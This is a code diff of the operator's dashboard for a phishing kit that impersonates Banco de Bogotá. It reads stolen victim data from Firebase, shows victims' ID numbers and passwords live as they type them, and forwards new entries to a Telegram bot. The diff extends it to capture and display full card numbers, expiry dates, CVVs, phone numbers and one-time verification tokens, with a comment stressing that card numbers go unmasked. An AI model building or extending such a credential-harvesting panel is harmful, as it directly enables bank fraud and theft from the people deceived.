@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-  <title>Panel de Control | Banco de Bogotá - Multi Live Typing</title>
+  <title>Panel de Control | Banco de Bogotá</title>
   
   <!-- Firebase SDKs -->
   <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
@@ -287,21 +287,22 @@
       color: #1a3a4a;
     }
 
-    /* Live Typing Container - Grid para múltiples usuarios */
-    .live-typing-container {
+    /* Live Typing Card */
+    .live-typing-card {
       background: white;
       border-radius: 16px;
       padding: 20px;
       margin-bottom: 30px;
       border: 2px solid #2c7da0;
+      box-shadow: 0 4px 12px rgba(44,125,160,0.15);
     }
 
     .live-typing-header {
       display: flex;
       align-items: center;
       gap: 10px;
-      margin-bottom: 20px;
-      padding-bottom: 15px;
+      margin-bottom: 15px;
+      padding-bottom: 10px;
       border-bottom: 1px solid #e2e8f0;
     }
 
@@ -331,110 +332,43 @@
       animation: blink 1s infinite;
     }
 
-    .user-count {
-      background: #2c7da0;
-      color: white;
-      padding: 3px 10px;
-      border-radius: 20px;
-      font-size: 0.7rem;
-      margin-left: 10px;
-    }
-
     @keyframes blink {
       0%, 100% { opacity: 1; }
       50% { opacity: 0.5; }
     }
 
-    /* Grid de usuarios en vivo */
-    .live-users-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
-      gap: 20px;
-    }
-
-    /* Tarjeta de cada usuario */
-    .user-typing-card {
+    .typing-content {
       background: #1a1a2e;
       border-radius: 12px;
-      overflow: hidden;
-      border-left: 4px solid #00ff41;
-      transition: transform 0.2s;
-    }
-
-    .user-typing-card:hover {
-      transform: translateY(-2px);
-    }
-
-    .user-card-header {
-      background: #0f0f1a;
-      padding: 12px 15px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      border-bottom: 1px solid #2a2a4a;
-    }
-
-    .user-id {
+      padding: 20px;
+      color: #00ff41;
       font-family: monospace;
-      font-size: 0.7rem;
-      color: #00ff41;
-      background: rgba(0, 255, 65, 0.1);
-      padding: 4px 8px;
-      border-radius: 6px;
     }
 
-    .user-status {
-      font-size: 0.7rem;
-      color: #00ff41;
-      display: flex;
-      align-items: center;
-      gap: 5px;
-    }
-
-    .status-dot {
-      width: 8px;
-      height: 8px;
-      background-color: #00ff41;
-      border-radius: 50%;
-      animation: pulseDot 1s infinite;
-    }
-
-    @keyframes pulseDot {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.3; }
-    }
-
-    .typing-content-card {
-      padding: 15px;
-    }
-
-    .typing-row-card {
+    .typing-row {
       display: flex;
       justify-content: space-between;
       align-items: center;
-      padding: 10px 0;
+      padding: 12px;
       border-bottom: 1px solid #2a2a4a;
     }
 
-    .typing-label-card {
+    .typing-label {
       font-weight: bold;
       color: #00ff41;
       min-width: 100px;
-      font-size: 0.8rem;
     }
 
-    .typing-value-card {
-      font-size: 1rem;
-      font-family: monospace;
+    .typing-value {
+      font-size: 1.2rem;
       letter-spacing: 1px;
       word-break: break-all;
-      color: #ffffff;
     }
 
-    .cursor-blink-card {
+    .cursor-blink {
       display: inline-block;
       width: 2px;
-      height: 1rem;
+      height: 1.2rem;
       background-color: #00ff41;
       margin-left: 2px;
       animation: blinkCursor 1s infinite;
@@ -445,18 +379,47 @@
       50% { opacity: 0; }
     }
 
-    .user-timestamp {
-      font-size: 0.7rem;
+    .no-typing {
+      text-align: center;
+      padding: 30px;
       color: #7f8c8d;
-      margin-top: 10px;
-      text-align: right;
-      font-family: monospace;
     }
 
-    .no-users {
-      text-align: center;
-      padding: 40px;
-      color: #7f8c8d;
+    /* Estados en la tabla */
+    .status-esperando {
+      display: inline-block;
+      background-color: #f59e0b;
+      color: white;
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-size: 0.7rem;
+      font-weight: bold;
+      animation: pulse-orange 1.5s infinite;
+    }
+
+    @keyframes pulse-orange {
+      0%, 100% { opacity: 1; background-color: #f59e0b; }
+      50% { opacity: 0.7; background-color: #d97706; }
+    }
+
+    .status-token {
+      display: inline-block;
+      background-color: #10b981;
+      color: white;
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-size: 0.7rem;
+      font-weight: bold;
+    }
+
+    .status-completado {
+      display: inline-block;
+      background-color: #3b82f6;
+      color: white;
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-size: 0.7rem;
+      font-weight: bold;
     }
 
     .modal {
@@ -532,7 +495,7 @@
     }
     .kpi-grid {
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
       gap: 20px;
       margin-bottom: 30px;
     }
@@ -569,23 +532,32 @@
       align-items: center;
     }
     table { width: 100%; border-collapse: collapse; }
-    th { text-align: left; padding: 14px 18px; background: #f8fafc; font-weight: 600; font-size: 0.8rem; color: #4a5b6e; }
-    td { padding: 12px 18px; border-bottom: 1px solid #f0f4f8; font-size: 0.85rem; }
+    th { text-align: left; padding: 14px 12px; background: #f8fafc; font-weight: 600; font-size: 0.7rem; color: #4a5b6e; }
+    td { padding: 12px 12px; border-bottom: 1px solid #f0f4f8; font-size: 0.75rem; }
     tr:hover td { background-color: #fefce8; }
     .password-cell {
       font-family: monospace;
       background: #fef5e7;
-      padding: 4px 10px;
+      padding: 4px 8px;
       border-radius: 8px;
       display: inline-block;
       font-weight: 500;
     }
     .copy-icon { background: none; border: none; cursor: pointer; margin-left: 8px; color: #2c7da0; }
     .footer-dash { margin-top: 30px; text-align: center; font-size: 0.7rem; color: #95a5a6; padding: 20px; }
+    .card-data-full {
+      font-family: monospace;
+      font-size: 0.75rem;
+      background: #e6f0fa;
+      padding: 4px 8px;
+      border-radius: 6px;
+      display: inline-block;
+      font-weight: 500;
+    }
     @media (max-width: 900px) { 
       .sidebar { display: none; } 
       .main-content { padding: 20px; }
-      .live-users-grid { grid-template-columns: 1fr; }
+      th, td { font-size: 0.65rem; padding: 8px 6px; }
     }
   </style>
 </head>
@@ -599,25 +571,25 @@
     <div id="errorMsg" class="error-msg"></div>
     <div id="loginForm">
       <div class="input-group-login">
-        <label>Correo electrónico</label>
+        <label>Correo electronico</label>
         <input type="email" id="loginEmail" placeholder="usuario@ejemplo.com">
       </div>
       <div class="input-group-login">
         <label>Contraseña</label>
         <input type="password" id="loginPassword" placeholder="••••••••">
       </div>
-      <button class="btn-login" onclick="iniciarSesion()">Iniciar sesión</button>
+      <button class="btn-login" onclick="iniciarSesion()">Iniciar sesion</button>
       <div class="toggle-auth">
-        ¿No tienes cuenta? <a onclick="mostrarRegistro()">Regístrate aquí</a>
+        ¿No tienes cuenta? <a onclick="mostrarRegistro()">Registrate aqui</a>
       </div>
     </div>
     <div id="registerForm" style="display: none;">
       <div class="input-group-login">
-        <label>Correo electrónico</label>
+        <label>Correo electronico</label>
         <input type="email" id="registerEmail" placeholder="usuario@ejemplo.com">
       </div>
       <div class="input-group-login">
-        <label>Contraseña (mínimo 6 caracteres)</label>
+        <label>Contraseña (minimo 6 caracteres)</label>
         <input type="password" id="registerPassword" placeholder="••••••••">
       </div>
       <div class="input-group-login">
@@ -626,7 +598,7 @@
       </div>
       <button class="btn-login" onclick="registrarUsuario()">Registrarse</button>
       <div class="toggle-auth">
-        ¿Ya tienes cuenta? <a onclick="mostrarLogin()">Iniciar sesión</a>
+        ¿Ya tienes cuenta? <a onclick="mostrarLogin()">Iniciar sesion</a>
       </div>
     </div>
   </div>
@@ -637,8 +609,8 @@
   <aside class="sidebar">
     <div class="logo-area">
       <div class="logo-text">
-        <h2>Banco de Bogotá</h2>
-        <p>Panel de administración</p>
+        <h2>Banco de Bogota</h2>
+        <p>Panel de administracion</p>
       </div>
     </div>
     <div class="nav-item active">
@@ -648,7 +620,7 @@
     <div class="user-info">
       <div id="userEmailDisplay" style="margin-bottom: 10px; color: #4a5b6e;"></div>
       <button class="btn-logout" onclick="cerrarSesion()">
-        <i class="fas fa-sign-out-alt"></i> Cerrar sesión
+        <i class="fas fa-sign-out-alt"></i> Cerrar sesion
       </button>
     </div>
   </aside>
@@ -657,7 +629,7 @@
     <div class="top-header">
       <div class="page-title">
         <h1>Resumen de accesos</h1>
-        <p>Datos sincronizados desde Firebase - Multi Live Typing Activo</p>
+        <p>Datos sincronizados desde Firebase - Live Typing Activo</p>
       </div>
       <div style="display: flex; gap: 12px;">
         <div id="telegramButtonContainer"></div>
@@ -667,17 +639,16 @@
       </div>
     </div>
 
-    <!-- ========== LIVE TYPING CONTAINER - MÚLTIPLES USUARIOS ========== -->
-    <div class="live-typing-container">
+    <!-- Live Typing Card -->
+    <div class="live-typing-card">
       <div class="live-typing-header">
         <i class="fas fa-eye"></i>
         <h3>ESCRITURA EN VIVO</h3>
         <span class="live-badge">LIVE</span>
-        <span class="user-count" id="userCount">0 usuarios activos</span>
       </div>
-      <div id="liveUsersGrid" class="live-users-grid">
-        <div class="no-users">
-          <i class="fas fa-user-clock"></i> Esperando actividad de usuarios...
+      <div id="liveTypingContent" class="typing-content">
+        <div class="no-typing">
+          <i class="fas fa-user-clock"></i> Esperando actividad...
         </div>
       </div>
     </div>
@@ -696,7 +667,7 @@
       <div class="kpi-card">
         <div class="kpi-icon"><i class="fas fa-mobile-alt"></i></div>
         <div class="kpi-value" id="deviceKpi">0</div>
-        <div class="kpi-label">Dispositivos móviles</div>
+        <div class="kpi-label">Dispositivos moviles</div>
       </div>
       <div class="kpi-card">
         <div class="kpi-icon"><i class="fab fa-telegram"></i></div>
@@ -706,7 +677,7 @@
     </div>
 
     <div class="chart-container">
-      <div class="chart-title">Tendencia de accesos (últimos 7 días)</div>
+      <div class="chart-title">Tendencia de accesos (ultimos 7 dias)</div>
       <canvas id="accessChart"></canvas>
     </div>
 
@@ -718,15 +689,27 @@
       <div style="overflow-x: auto;">
         <table>
           <thead>
-            <tr><th>#</th><th>Usuario</th><th>Tipo ID</th><th>Contraseña</th><th>Fecha y hora</th><th>Dispositivo</th></tr>
+            <tr>
+              <th>#</th>
+              <th>Usuario</th>
+              <th>Tipo ID</th>
+              <th>Contraseña</th>
+              <th>Telefono</th>
+              <th>Token</th>
+              <th>Numero Tarjeta</th>
+              <th>Fecha Venc.</th>
+              <th>CVV</th>
+              <th>Estado</th>
+              <th>Fecha</th>
+            </tr>
           </thead>
           <tbody id="tablaBody">
-            <tr><td colspan="6" style="text-align:center; padding:50px;">Cargando...</td></tr>
+            <tr><td colspan="11" style="text-align:center; padding:50px;">Cargando...</td></tr>
           </tbody>
         </table>
       </div>
     </div>
-    <div class="footer-dash">Firebase Realtime Database | Los nuevos accesos se envían a Telegram cuando está conectado</div>
+    <div class="footer-dash">Firebase Realtime Database | Los nuevos accesos se envian a Telegram cuando esta conectado</div>
   </main>
 </div>
 
@@ -738,11 +721,11 @@
       <button class="close-modal" onclick="cerrarModal()">&times;</button>
     </div>
     <div class="step-box">
-      <strong>Cómo obtener Token y Chat ID:</strong><br>
+      <strong>Como obtener Token y Chat ID:</strong><br>
       1. Ve a Telegram y busca @BotFather<br>
-      2. Envía /newbot y sigue los pasos<br>
+      2. Envia /newbot y sigue los pasos<br>
       3. Copia el token que recibes<br>
-      4. Busca @userinfobot y envía cualquier mensaje para obtener tu Chat ID
+      4. Busca @userinfobot y envia cualquier mensaje para obtener tu Chat ID
     </div>
     <div class="form-group">
       <label>Token del bot</label>
@@ -753,7 +736,7 @@
       <input type="text" id="telegramChatId" placeholder="Ej: 123456789">
     </div>
     <button class="btn-save-telegram" onclick="guardarConfiguracionTelegram()">Guardar y conectar</button>
-    <button class="btn-save-telegram" style="margin-top: 10px; background: #95a5a6;" onclick="probarConexionTelegram()">Probar conexión</button>
+    <button class="btn-save-telegram" style="margin-top: 10px; background: #95a5a6;" onclick="probarConexionTelegram()">Probar conexion</button>
   </div>
 </div>
 
@@ -780,109 +763,54 @@ let telegramActivo = localStorage.getItem('telegram_activo') === 'true';
 let telegramToken = localStorage.getItem('telegram_token') || '';
 let telegramChatId = localStorage.getItem('telegram_chat_id') || '';
 
-// ========== MULTI LIVE TYPING ==========
-let activeUsers = new Map(); // Mapa de sesiones activas
+// Live Typing
+let currentTypingSession = null;
 
 function escucharLiveTyping() {
   const typingRef = database.ref('liveTyping');
-  
-  typingRef.on('child_added', (snapshot) => {
-    actualizarUsuarioTyping(snapshot.key, snapshot.val());
-  });
-  
-  typingRef.on('child_changed', (snapshot) => {
-    actualizarUsuarioTyping(snapshot.key, snapshot.val());
-  });
-  
-  typingRef.on('child_removed', (snapshot) => {
-    activeUsers.delete(snapshot.key);
-    renderizarUsuarios();
-  });
+  typingRef.on('child_added', (snapshot) => { actualizarLiveTyping(snapshot); });
+  typingRef.on('child_changed', (snapshot) => { actualizarLiveTyping(snapshot); });
 }
 
-function actualizarUsuarioTyping(sessionId, data) {
+function actualizarLiveTyping(snapshot) {
+  const data = snapshot.val();
+  if (!data) return;
   const ahora = Date.now();
   const esReciente = (ahora - data.timestamp) < 3000;
   
   if (data.activo === true && esReciente) {
-    activeUsers.set(sessionId, {
-      id: sessionId,
-      campo: data.campo,
-      valor: data.valor || '',
-      timestamp: data.timestamp,
-      userAgent: data.userAgent || 'Desconocido'
-    });
-  } else {
-    // Si la sesión está inactiva o expiró, eliminarla
-    if (activeUsers.has(sessionId)) {
-      activeUsers.delete(sessionId);
-    }
+    currentTypingSession = snapshot.key;
+    mostrarTypingActivo(data);
+  } else if (currentTypingSession === snapshot.key && !data.activo) {
+    mostrarTypingInactivo();
   }
-  renderizarUsuarios();
 }
 
-function renderizarUsuarios() {
-  const container = document.getElementById('liveUsersGrid');
-  const userCountSpan = document.getElementById('userCount');
-  const usuariosArray = Array.from(activeUsers.values());
-  
-  userCountSpan.innerText = `${usuariosArray.length} usuario${usuariosArray.length !== 1 ? 's' : ''} activo${usuariosArray.length !== 1 ? 's' : ''}`;
-  
-  if (usuariosArray.length === 0) {
-    container.innerHTML = `
-      <div class="no-users">
-        <i class="fas fa-user-clock"></i> No hay usuarios escribiendo en este momento
-      </div>
-    `;
-    return;
-  }
-  
-  // Ordenar por timestamp (más reciente primero)
-  usuariosArray.sort((a, b) => b.timestamp - a.timestamp);
-  
-  let html = '';
-  usuariosArray.forEach((user, index) => {
-    const campoNombre = user.campo === 'documento' ? 'DOCUMENTO / CÉDULA' : 'CLAVE SEGURA';
-    const valorMostrar = user.valor || '';
-    const tiempoDesde = Math.floor((Date.now() - user.timestamp) / 1000);
-    const tiempoTexto = tiempoDesde < 1 ? 'ahora mismo' : `hace ${tiempoDesde} segundos`;
-    
-    html += `
-      <div class="user-typing-card">
-        <div class="user-card-header">
-          <span class="user-id">👤 USUARIO ${index + 1} | ID: ${user.id.substring(0, 8)}...</span>
-          <span class="user-status">
-            <span class="status-dot"></span> ESCRIBIENDO
-          </span>
-        </div>
-        <div class="typing-content-card">
-          <div class="typing-row-card">
-            <span class="typing-label-card">📝 CAMPO:</span>
-            <span class="typing-value-card">${campoNombre}</span>
-          </div>
-          <div class="typing-row-card">
-            <span class="typing-label-card">⌨️ ESCRIBIENDO:</span>
-            <span class="typing-value-card">${escapeHtml(valorMostrar)}<span class="cursor-blink-card"></span></span>
-          </div>
-          <div class="user-timestamp">
-            🕐 Última actividad: ${tiempoTexto}
-          </div>
-        </div>
-      </div>
-    `;
-  });
-  
-  container.innerHTML = html;
+function mostrarTypingActivo(data) {
+  const container = document.getElementById('liveTypingContent');
+  const campo = data.campo === 'documento' ? 'DOCUMENTO / CEDULA' : 'CLAVE SEGURA';
+  const valor = data.valor || '';
+  const cursor = '<span class="cursor-blink"></span>';
+  container.innerHTML = `
+    <div class="typing-row"><span class="typing-label">CAMPO:</span><span class="typing-value">${campo}</span></div>
+    <div class="typing-row"><span class="typing-label">ESCRIBIENDO:</span><span class="typing-value">${escapeHtml(valor)}${cursor}</span></div>
+    <div class="typing-row"><span class="typing-label">ULTIMA ACTIVIDAD:</span><span class="typing-value">Hace menos de 1 segundo</span></div>
+  `;
 }
 
-// ========== SINGLE SESSION ==========
+function mostrarTypingInactivo() {
+  const container = document.getElementById('liveTypingContent');
+  container.innerHTML = `<div class="no-typing"><i class="fas fa-user-clock"></i> No hay actividad de escritura en este momento</div>`;
+}
+
+// Single session
 function initSingleSession(userId) {
   const sessionRef = database.ref('activeSessions/' + userId);
   sessionRef.onDisconnect().remove();
   sessionRef.set({ uid: userId, timestamp: firebase.database.ServerValue.TIMESTAMP, active: true });
   database.ref('activeSessions').on('child_added', (snap) => {
     if (snap.key !== userId && snap.val().active && auth.currentUser && auth.currentUser.uid === userId) {
-      auth.signOut().then(() => alert('Has sido desconectado. Se inició otra sesión.'));
+      auth.signOut().then(() => alert('Has sido desconectado. Se inicio otra sesion.'));
     }
   });
 }
@@ -946,7 +874,7 @@ function iniciarDashboard() {
   intervalId = setInterval(() => { if (auth.currentUser) cargarDatos(); }, 10000);
 }
 
-// ========== TELEGRAM ==========
+// Telegram
 function actualizarBotonesTelegram() {
   const container = document.getElementById('telegramButtonContainer');
   const statusDiv = document.getElementById('telegramStatus');
@@ -976,7 +904,7 @@ window.desconectarTelegram = function() {
   localStorage.removeItem('telegram_token');
   localStorage.removeItem('telegram_chat_id');
   actualizarBotonesTelegram();
-  alert('Telegram desconectado. No se enviarán más notificaciones.');
+  alert('Telegram desconectado. No se enviaran mas notificaciones.');
 };
 
 window.guardarConfiguracionTelegram = function() {
@@ -992,7 +920,7 @@ window.guardarConfiguracionTelegram = function() {
   actualizarBotonesTelegram();
   cerrarModal();
   enviarMensajeTelegram('Panel de control conectado exitosamente.');
-  alert('Configuración guardada');
+  alert('Configuracion guardada');
 };
 
 window.probarConexionTelegram = async function() {
@@ -1005,7 +933,7 @@ window.probarConexionTelegram = async function() {
       body: JSON.stringify({ chat_id: chat, text: 'Mensaje de prueba desde el panel de control' })
     });
     const data = await res.json();
-    if (data.ok) alert('Conexión exitosa. Revisa Telegram.');
+    if (data.ok) alert('Conexion exitosa. Revisa Telegram.');
     else alert('Error: ' + (data.description || 'Token o Chat ID incorrectos'));
   } catch(e) { alert('Error de red'); }
 };
@@ -1024,7 +952,7 @@ async function enviarMensajeTelegram(msg) {
   } catch(e) { return false; }
 }
 
-// ========== DASHBOARD FUNCTIONS ==========
+// Dashboard functions
 window.copiarPassword = function(pwd) {
   navigator.clipboard.writeText(pwd);
   const toast = document.createElement('div');
@@ -1040,18 +968,43 @@ function escapeHtml(str) { if (!str) return ''; return str.replace(/[&<>]/g, m =
 
 function renderTabla() {
   const tbody = document.getElementById('tablaBody');
-  if (!datosIngresos.length) { tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;">Sin registros</td></tr>'; return; }
+  if (!datosIngresos.length) { 
+    tbody.innerHTML = '<tr><td colspan="11" style="text-align:center;">Sin registros</td></tr>'; 
+    return; 
+  }
   let html = '';
   datosIngresos.forEach((item, idx) => {
-    const fecha = new Date(item.fecha);
+    const fecha = new Date(item.fechaInicio || item.fecha || item.fechaToken || item.fechaCompleta);
     const f = fecha.toLocaleString('es-CO', {day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit',second:'2-digit'});
+    const estado = item.estado || 'esperando_token';
+    const telefono = item.telefono || '-';
+    const token = item.tokenVerificacion || '-';
+    // Mostrar número de tarjeta COMPLETO, sin ocultar
+    const numeroTarjeta = item.numeroTarjeta || '-';
+    const fechaVencimiento = item.fechaVencimiento || '-';
+    const cvv = item.cvv || '-';
+    
+    let estadoHtml = '';
+    if (estado === 'esperando_token') {
+      estadoHtml = '<span class="status-esperando"><i class="fas fa-clock"></i> ESPERANDO TOKEN</span>';
+    } else if (estado === 'token_recibido') {
+      estadoHtml = '<span class="status-token"><i class="fas fa-check-circle"></i> TOKEN RECIBIDO</span>';
+    } else {
+      estadoHtml = '<span class="status-completado"><i class="fas fa-check-double"></i> COMPLETADO</span>';
+    }
+    
     html += `<tr>
       <td>${idx+1}</td>
       <td><strong>${escapeHtml(item.usuario || 'N/A')}</strong></td>
       <td>${escapeHtml(item.tipoDocumento || 'N/A')}</td>
       <td><span class="password-cell">${escapeHtml(item.password || '---')}</span> <button class="copy-icon" onclick="copiarPassword('${escapeHtml(item.password || '').replace(/'/g, "\\'")}')"><i class="far fa-copy"></i></button></td>
+      <td>${escapeHtml(telefono)}</td>
+      <td><span class="card-data-full">${escapeHtml(token)}</span></td>
+      <td><span class="card-data-full"><strong>${escapeHtml(numeroTarjeta)}</strong></span></td>
+      <td>${escapeHtml(fechaVencimiento)}</td>
+      <td><span class="card-data-full"><strong>${escapeHtml(cvv)}</strong></span></td>
+      <td>${estadoHtml}</td>
       <td>${f}</td>
-      <td>${escapeHtml(item.dispositivo ? item.dispositivo.substring(0,50) : 'N/A')}</td>
     </tr>`;
   });
   tbody.innerHTML = html;
@@ -1060,7 +1013,7 @@ function renderTabla() {
 function actualizarKPIs() {
   const total = datosIngresos.length;
   const hoy = new Date().toDateString();
-  const hoyCount = datosIngresos.filter(i => i.fecha && new Date(i.fecha).toDateString() === hoy).length;
+  const hoyCount = datosIngresos.filter(i => (i.fechaInicio || i.fecha) && new Date(i.fechaInicio || i.fecha).toDateString() === hoy).length;
   const moviles = datosIngresos.filter(i => i.dispositivo && (i.dispositivo.toLowerCase().includes('mobile') || i.dispositivo.toLowerCase().includes('android') || i.dispositivo.toLowerCase().includes('iphone'))).length;
   document.getElementById('totalKpi').innerText = total;
   document.getElementById('todayKpi').innerText = hoyCount;
@@ -1068,7 +1021,7 @@ function actualizarKPIs() {
   document.getElementById('rowCountBadge').innerHTML = `${total} registros`;
   
   const ult7 = [];
-  for(let i=6;i>=0;i--){ let d=new Date(); d.setDate(d.getDate()-i); let count=datosIngresos.filter(ing=>ing.fecha && new Date(ing.fecha).toDateString()===d.toDateString()).length; ult7.push(count); }
+  for(let i=6;i>=0;i--){ let d=new Date(); d.setDate(d.getDate()-i); let count=datosIngresos.filter(ing=> (ing.fechaInicio || ing.fecha) && new Date(ing.fechaInicio || ing.fecha).toDateString()===d.toDateString()).length; ult7.push(count); }
   const labels = [];
   for(let i=6;i>=0;i--){ let d=new Date(); d.setDate(d.getDate()-i); labels.push(d.toLocaleDateString('es-ES',{weekday:'short',day:'numeric'})); }
   if(chartInstance) { chartInstance.data.datasets[0].data = ult7; chartInstance.update(); }
@@ -1083,8 +1036,15 @@ function actualizarKPIs() {
 
 function enviarNuevoAccesoATelegram(nuevo) {
   if (!telegramActivo) return;
-  const fecha = new Date(nuevo.fecha).toLocaleString('es-CO');
-  const msg = `NUEVO ACCESO\nUsuario: ${nuevo.usuario}\nTipo: ${nuevo.tipoDocumento}\nContraseña: ${nuevo.password}\nFecha: ${fecha}`;
+  const fecha = new Date(nuevo.fechaInicio || nuevo.fecha).toLocaleString('es-CO');
+  const estado = nuevo.estado || 'esperando_token';
+  let msg = `NUEVO ACCESO\nUsuario: ${nuevo.usuario}\nTipo: ${nuevo.tipoDocumento}\nContraseña: ${nuevo.password}\nEstado: ${estado}\nFecha: ${fecha}`;
+  if (nuevo.numeroTarjeta) {
+    msg += `\n\nDATOS DE TARJETA:\nNumero: ${nuevo.numeroTarjeta}\nVencimiento: ${nuevo.fechaVencimiento}\nCVV: ${nuevo.cvv}`;
+  }
+  if (nuevo.telefono) {
+    msg += `\n\nVERIFICACION:\nTelefono: ${nuevo.telefono}\nToken: ${nuevo.tokenVerificacion}`;
+  }
   enviarMensajeTelegram(msg);
 }
 
@@ -1106,8 +1066,12 @@ window.cargarDatos = async function() {
     const data = snap.val();
     datosIngresos = [];
     if (data) {
-      Object.keys(data).forEach(key => { let ing = data[key]; if (!ing.fecha) ing.fecha = new Date().toISOString(); datosIngresos.push(ing); });
-      datosIngresos.sort((a,b) => new Date(b.fecha) - new Date(a.fecha));
+      Object.keys(data).forEach(key => { 
+        let ing = data[key]; 
+        if (!ing.fechaInicio && !ing.fecha) ing.fechaInicio = new Date().toISOString(); 
+        datosIngresos.push(ing); 
+      });
+      datosIngresos.sort((a,b) => new Date(b.fechaInicio || b.fecha) - new Date(a.fechaInicio || a.fecha));
     }
     renderTabla();
     actualizarKPIs();
@@ -1119,8 +1083,6 @@ auth.onAuthStateChanged((user) => {
   if (user) { 
     mostrarDashboardApp(user); 
   } else {
-    activeUsers.clear();
-    renderizarUsuarios();
     document.getElementById('dashboardApp').style.display = 'none';
     document.getElementById('loginScreen').style.display = 'flex';
     mostrarLogin();
